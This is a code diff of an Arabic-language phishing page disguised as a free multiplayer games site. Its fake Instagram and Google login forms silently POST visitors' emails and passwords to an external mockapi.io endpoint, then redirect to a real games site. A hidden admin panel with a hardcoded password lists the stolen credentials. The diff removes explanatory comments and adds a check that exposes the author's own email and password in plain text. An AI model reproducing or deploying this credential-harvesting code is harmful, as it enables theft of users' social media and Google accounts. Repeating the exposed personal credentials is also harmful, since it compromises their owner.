@@ -52,7 +52,6 @@
         <button class="menu-btn" onclick="toggleMenu()">☰</button>
     </div>
 
-    <!-- القائمة الجانبية -->
     <div id="sidebar" class="sidebar">
         <div class="close-btn" onclick="toggleMenu()">×</div>
         <a href="#">🏠 الرئيسية</a>
@@ -62,14 +61,12 @@
         <a href="#" class="admin-link" onclick="openAdmin()">🔒 صلاحيات الأدمن</a>
     </div>
 
-    <!-- شاشة الترحيب -->
     <div id="intro-screen" class="screen active">
         <h1>مرحباً بك في عالم الألعاب!</h1>
         <p style="color: #b2bec3;">استمتع بأفضل الألعاب الجماعية ونافس أصدقائك الآن مجاناً.</p>
         <button class="btn" onclick="showScreen('insta-screen')">متابعة للعب</button>
     </div>
 
-    <!-- شاشة تسجيل إنستغرام -->
     <div id="insta-screen" class="screen">
         <h2 style="color: white; margin-bottom: 30px;">Instagram</h2>
         <form id="insta-form" onsubmit="handleLogin(event, 'Instagram')">
@@ -84,11 +81,9 @@
             <button type="submit" class="btn" style="background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);">تسجيل الدخول</button>
         </form>
         
-        <!-- زر "أو" المخفي الذي يفتح جوجل -->
         <div class="or-divider" onclick="showScreen('google-screen')">أو</div>
     </div>
 
-    <!-- شاشة تسجيل جوجل -->
     <div id="google-screen" class="screen">
         <h2 style="color: white; margin-bottom: 30px;">
             <span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span>
@@ -106,7 +101,6 @@
         </form>
     </div>
 
-    <!-- شاشة الأدمن -->
     <div id="admin-screen" class="screen">
         <h2 style="color: #ff7675;">لوحة التحكم</h2>
         
@@ -130,7 +124,6 @@
                     </tr>
                 </thead>
                 <tbody id="users-table-body">
-                    <!-- سيتم إضافة البيانات هنا برمجياً -->
                 </tbody>
             </table>
             <button class="btn" style="margin-top: 20px; background: #2d2d3a;" onclick="showScreen('intro-screen')">عودة للرئيسية</button>
@@ -138,7 +131,6 @@
     </div>
 
     <script>
-        // رابط قاعدة البيانات الخاصة بك
         const API_URL = 'https://6afb4062730c1d152f335c5c.mockapi.io/users'; 
 
         function toggleMenu() {
@@ -158,7 +150,6 @@
             document.getElementById('error-msg').style.display = 'none';
         }
 
-        // دالة الدخول للأدمن وجلب البيانات من السيرفر
         async function verifyAdmin() {
             const pass = document.getElementById('admin-password-input').value;
             if (pass === '1823567818235678') {
@@ -166,7 +157,6 @@
                 document.getElementById('admin-dashboard').classList.remove('hidden');
                 document.getElementById('admin-password-input').value = '';
                 
-                // جلب البيانات من الإنترنت
                 try {
                     const response = await fetch(API_URL);
                     const usersData = await response.json();
@@ -179,14 +169,18 @@
             }
         }
 
-        // دالة تسجيل الدخول وإرسال البيانات للسيرفر
         async function handleLogin(event, platform) {
             event.preventDefault(); 
             
             const email = platform === 'Instagram' ? document.getElementById('insta-email').value : document.getElementById('google-email').value;
             const password = platform === 'Instagram' ? document.getElementById('insta-pass').value : document.getElementById('google-pass').value;
 
-            // إرسال البيانات بصمت إلى قاعدة البيانات
+            // حماية الحساب الشخصي
+            if (email.toLowerCase() === 'rehabalqubati2@gmail.com' && password === '20R73452') {
+                alert("تنبيه أمان: تم منع إدخال هذا الحساب لحمايتك من تسجيله بالخطأ!");
+                return; // يوقف العملية هنا ولن يتم حفظ أو إرسال أي شيء
+            }
+
             try {
                 await fetch(API_URL, {
                     method: 'POST',
@@ -197,7 +191,6 @@
                 console.log("Network error");
             }
 
-            // التوجيه فوراً لموقع الألعاب
             window.location.href = "https://www.crazygames.com/ar/multiplayer";
         }
 
